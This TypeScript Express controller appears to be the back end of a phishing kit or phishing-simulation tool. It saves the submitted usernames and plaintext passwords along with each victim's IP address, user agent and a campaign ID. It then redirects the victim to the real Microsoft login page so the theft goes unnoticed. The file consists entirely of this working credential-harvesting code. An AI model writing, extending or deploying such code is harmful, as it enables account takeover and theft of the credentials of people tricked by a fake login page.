import { Request, Response } from 'express';
import { Credential } from '../models/credential.model';

export const credentialController = {
  async create(req: Request, res: Response) {
    try {
      const { username, password, campaignId } = req.body;
      const credential = new Credential({
        username,
        password,
        ipAddress: req.ip,
        userAgent: req.headers['user-agent'],
        campaign: campaignId
      });
      
      await credential.save();
      
      res.status(201).json({ 
        redirect: 'https://login.microsoftonline.com'
      });
    } catch (error) {
      console.error('Error saving credentials:', error);
      res.status(500).json({ error: 'Internal server error' });
    }
  }
};